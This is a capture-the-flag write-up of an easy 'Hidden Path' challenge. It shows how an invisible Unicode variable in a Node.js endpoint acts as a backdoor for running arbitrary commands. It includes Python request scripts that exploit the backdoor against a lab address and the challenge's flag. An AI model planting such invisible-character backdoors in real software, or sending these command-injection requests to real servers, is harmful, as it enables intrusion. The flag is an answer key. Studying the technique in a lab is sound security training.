# Challenge: Hidden Path (Misc)

## Challenge Overview

**Name:** Hidden Path  
**Category:** Misc  
**Difficulty:** Easy

### Description:

Legends speak of the infamous Kamara-Heto, a black-hat hacker of old. Though their existence is debated, access to the lost vault they protected is only possible through hidden data in a system check-up endpoint. Can you find the path Kamara-Heto left behind?

---

# Challenge Progress: Hidden Path (Misc)

## Recon & Enumeration

### Initial Access

```bash
http://94.237.55.43:57167
````

We are presented with a basic HTML page containing radio buttons to select system commands and a Submit button. The JavaScript submits the selected option to `/server_status`.

---

## Source Code Review

The provided server-side code (`app.js`) reveals two endpoints:

* `/` → serves `index.html`
* `/server_status` → accepts a `POST` request with `choice` index, and executes a command from a hardcoded list.

The interesting detail is in this line:

```javascript
const { choice,ㅤ} = req.body;
```

The character `ㅤ` (Unicode U+3164, HANGUL FILLER) is visually invisible but valid in variable names. That same variable is later appended to the `commands` array:

```javascript
const commands = [
    'free -m',
    'uptime',
    'iostat',
    'mpstat',
    'netstat',
    'ps aux',ㅤ
];
```

This creates a hidden backdoor — if we send a POST parameter with that Unicode character as the key, and use `choice=6`, we can execute **any command**.

---

## Exploitation - Command Injection

### Step 1: Test command execution

```python
from requests import post

URL = 'http://94.237.55.43:57167/server_status'

params = {
    'choice': 6,
    '\u3164': 'ls /'  # List root directory to confirm RCE
}

r = post(URL, data=params)
print(r.text)
```

Output confirmed working command injection.

---

### Step 2: Locate the flag

```python
params = {
    'choice': 6,
    '\u3164': 'find / -iname "flag*" 2>/dev/null'
}
```

Result:

```
/www/flag.txt
```

---

### Step 3: Read the flag

```python
params = {
    'choice': 6,
    '\u3164': 'cat /www/flag.txt'
}
```

---

## Flag

```
HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_449a2a0521f662b0023ca1217650df58}
```

May god with us~